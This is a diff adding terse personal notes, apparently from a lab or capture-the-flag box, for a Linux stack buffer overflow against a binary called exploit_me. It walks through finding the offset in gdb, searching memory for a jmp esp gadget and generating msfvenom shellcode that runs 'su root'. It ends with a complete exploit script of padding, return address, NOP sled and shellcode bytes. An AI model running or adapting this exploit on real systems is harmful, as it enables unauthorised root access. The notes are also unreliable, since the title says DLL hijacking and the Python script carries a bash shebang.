@@ -1,4 +1,50 @@
 DLL Hijacking on Dry Run issues
 
   - made a new script on the target box in this case www-data
+  - set my bin bash
+- set offset = "A" * 100
+- ran ./exploit_me $(python bench.py)
+- this gave me segmentation fault
+- opened gdb
+- file ./exploit_me
+- run $(python bench.py)
+- this will give you hex (ex: 0x41414141)
+- then go back to your script and paste the value from wiremask after putting in 100. (ex: offset = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A)
+- go back to gdb 
+- run $(python bench.py)
+- this will give you more hex. now put this hex in wiremask and this will be your offset. should look something like this --> (offset = "A" * 55)
+- now. --> gdb --> shell --> env - gdb ./exploit_me
+- unset env lines
+- unset env columns
+- start
+- info proc map
+- step
+- info proc map
+- until you find heap and stack (1st addy after heap and last addy after stack)
+- still in gdb
+-find /b <1st addr after heap>,<to the end of stack>, 0xff, 0xe4
+- find /b 0xf7de1000,0xffffe000,0xff,0xe4
+- keep mind of first five addresses but take the first one and turn it to little endian. 0xf7defb59 --> \x59\xfb\xde\xf7
+-  in new linops term run your msfvenom command. 
+- msfvenom -p linux/x86/exec CMD="su root" -b "\x00\fe\x20\x0a\xff" -f python
+- take this output and put it into your script
+- also set the nop in your script
+- now run your script with sudo in your target box.
+should look like this
+
+#!/bin/bash
   
+offset = "A" * 55
+eip = "\x59\xfb\xde\xf7"
+nop = "\x90" * 15
+
+buf =  b""
+buf += b"\xda\xde\xbf\xa5\x9d\x54\xcf\xd9\x74\x24\xf4\x5b"
+buf += b"\x33\xc9\xb1\x0b\x83\xc3\x04\x31\x7b\x16\x03\x7b"
+buf += b"\x16\xe2\x50\xf7\x5f\x97\x03\x5a\x06\x4f\x1e\x38"
+buf += b"\x4f\x68\x08\x91\x3c\x1f\xc8\x85\xed\xbd\xa1\x3b"
+buf += b"\x7b\xa2\x63\x2c\x73\x25\x83\xac\xf7\x50\xa3\xde"
+buf += b"\x98\xf5\xd7\x1e\x30\x59\x9e\xfe\x73\xdd"
+
+
+print(offset + eip + nop + buf)
